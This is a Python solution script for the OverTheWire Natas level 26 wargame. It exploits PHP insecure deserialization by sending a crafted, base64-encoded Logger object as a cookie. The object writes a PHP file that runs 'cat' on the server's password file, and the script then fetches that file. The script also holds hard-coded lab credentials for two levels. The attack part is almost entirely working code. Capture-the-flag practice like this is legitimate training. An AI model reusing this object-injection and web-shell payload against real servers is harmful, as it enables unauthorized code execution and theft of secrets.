#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()
response = session.get(url, auth=(username, password))

# our image file is stored under the name of our PHPSESSID, so let's asure that
# remember that we can control that PHPSESSID if we need as we sending the
# request through a python script or otherwise we could do that also through
# intercepting the request with Burpsuite and easily change it
# print (resopnse.cookies['PHPSESSID'])

# let's take a look of what that drawing object is about
# can be done using php code which its result is saying that's an
# array of arrays of all what you have be drawing so far in that session
# print (base64.b64decode(urllib.parse.unquote(response.cookies['drawing'])))


# for this challenge we send data through the GET method,
# so we need to update the url a little bit:
get_data = "?x1=0&y1=0&x2=500&y2=500"

# we also need to modifiy the drawing cookie using the
# result from 'natas26_tool.php'
session.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="

# let's make another request with the new cookie
response = session.get(url + get_data, auth=(username, password))

# now after we made a successful request to the server
# we should have another img/winner.php file there
# to get it we should change that change the url once again

winner_file = "img/winner.php"
response = session.get(url + winner_file, auth=(username, password))
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas27
# Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
